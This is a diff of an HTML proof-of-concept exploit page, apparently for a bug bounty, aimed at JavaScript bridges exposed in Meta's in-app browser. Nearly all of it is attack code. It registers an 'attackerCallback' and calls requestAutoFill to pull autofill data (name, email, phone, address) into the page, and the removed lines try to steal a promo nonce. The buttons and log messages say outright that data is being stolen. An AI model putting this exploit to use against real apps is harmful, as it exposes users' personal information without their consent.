@@ -4,9 +4,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Meta Bridge Exploitation PoC</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        button { padding: 15px; font-size: 16px; background: #ff0000; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 10px; }
-        #log { background: #111; color: #0f0; padding: 10px; font-family: monospace; height: 300px; overflow-y: scroll; word-wrap: break-word; }
+        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
+        button { padding: 15px; font-size: 16px; background: #d93025; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 10px; font-weight: bold; }
+        #log { background: #111; color: #0f0; padding: 10px; font-family: monospace; height: 300px; overflow-y: scroll; word-wrap: break-word; border-radius: 5px; }
     </style>
 </head>
 <body>
@@ -14,7 +14,6 @@
     <p>Target: linux-1723.github.io</p>
     
     <button onclick="attackAutofill()">1. Steal Autofill Data</button>
-    <button onclick="attackPromo()">2. Steal Promo Nonce</button>
     
     <h3>Execution Log:</h3>
     <div id="log">Waiting for action...<br></div>
@@ -24,10 +23,10 @@
             document.getElementById('log').innerHTML += msg + "<br>";
         }
 
-        // The Java bridge will likely call this global function to return the data
+        // The callback function that Meta's Java code will execute
         window.attackerCallback = function(data) {
-            log("<span style='color:red;'><b>🚨 DATA STOLEN:</b></span><br>" + JSON.stringify(data));
-            alert("BOUNTY SECURED! Data: " + JSON.stringify(data));
+            log("<span style='color:red;'><b>🚨 BOUNTY SECURED - DATA STOLEN:</b></span><br>" + JSON.stringify(data));
+            alert("Data extracted successfully!");
         };
 
         function attackAutofill() {
@@ -37,46 +36,33 @@
             }
             
             try {
-                log("Initializing callback handler...");
-                // Tell the Java side to send results to window.attackerCallback
-                window._AutofillExtensions.initializeCallbackHandler("attackerCallback");
+                log("Initializing callback handler with JSON...");
                 
+                // The log showed Java expects a JSON string here.
+                let initPayload = JSON.stringify({
+                    "callback": "attackerCallback",
+                    "callbackName": "attackerCallback",
+                    "name": "attackerCallback"
+                });
+                
+                window._AutofillExtensions.initializeCallbackHandler(initPayload);
+                log("Callback initialized.");
+
                 log("Requesting Autofill Data...");
-                // We pass a JSON string requesting common PII fields
-                let payload = JSON.stringify({
+                
+                // We also pass the callback inside the request payload just in case
+                let requestPayload = JSON.stringify({
+                    "callback": "attackerCallback",
+                    "callbackName": "attackerCallback",
                     "request_id": "1337",
                     "requested_fields": ["NAME", "EMAIL", "PHONE", "ADDRESS"]
                 });
                 
-                window._AutofillExtensions.requestAutoFill(payload);
-                log("requestAutoFill executed successfully! Waiting for callback...");
+                window._AutofillExtensions.requestAutoFill(requestPayload);
+                log("requestAutoFill executed! Check device screen for prompts.");
                 
             } catch (e) {
-                log("Failed to execute requestAutoFill: " + e.message);
-                
-                // Fallback: try calling it without arguments
-                try {
-                    log("Trying requestAutoFill without arguments...");
-                    window._AutofillExtensions.requestAutoFill();
-                } catch(err2) {
-                    log("Failed again: " + err2.message);
-                }
-            }
-        }
-
-        function attackPromo() {
-            if (!window._PromoExtensions) {
-                log("Error: _PromoExtensions not found.");
-                return;
-            }
-            try {
-                log("Calling getPromoExtensionNonce...");
-                // Sometimes methods return strings directly
-                let nonce = window._PromoExtensions.getPromoExtensionNonce();
-                log("<span style='color:red;'><b>🚨 NONCE STOLEN:</b></span> " + nonce);
-                alert("Stolen Nonce: " + nonce);
-            } catch (e) {
-                log("Failed: " + e.message);
+                log("Execution Failed: " + e.message);
             }
         }
     </script>
